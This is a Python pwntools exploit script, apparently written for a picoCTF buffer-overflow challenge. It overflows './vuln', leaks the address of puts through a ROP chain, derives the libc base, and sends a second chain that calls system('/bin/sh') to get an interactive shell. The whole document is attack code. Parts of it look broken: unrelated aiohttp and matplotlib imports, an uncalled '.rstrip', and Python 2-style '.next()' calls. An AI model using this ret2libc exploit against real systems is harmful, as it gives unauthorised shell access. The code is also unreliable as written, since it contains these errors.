from aiohttp import payload_type
from matplotlib.style import context
from pwn import *
from pprint import pprint

context.arch = 'amd64'

offset = 136

elf = ELF('./vuln')
p = elf.process() # process() is a convenience function that starts a process
#p = remote("mercury.picoctf.net",49464)

rop = ROP(elf)
rop.call(elf.symbols['puts'], [elf.got['puts']])
rop.call(elf.symbols['do_stuff'])

banner = "WeLcOmE To mY EcHo sErVeR!\n"

#print(p.recv())
p.recvuntil(banner)
#p.recvuntil("\0")

payload = [
    b'A' * offset,
    pack(elf.symbols['puts']),
    rop.chain()
]

payload = b''.join(payload)
print(payload)
p.sendline(payload)

puts = unpack(p.recvuntil(banner).rstrip.ljust(8, b'\x00'))
log.info(f"puts found at {hex(puts)}")

libc = ELF('./plibc.so.6')
libc.address = puts - libc.symbols['puts']
log.info(f"libc.so.6 found at {hex(libc.address)}")

rop = ROP(libc)
rop.call("puts", [libc.search(b'/bin/sh\x00').next()])
rop.call("system", [libc.search(b'/bin/sh\x00').next()])

payload = [
    b'A' * offset,
    rop.chain()
]

payload = b''.join(payload)

with open("payload", "wb") as f:
    f.write(payload)
p.sendline(payload)

p.interactive()

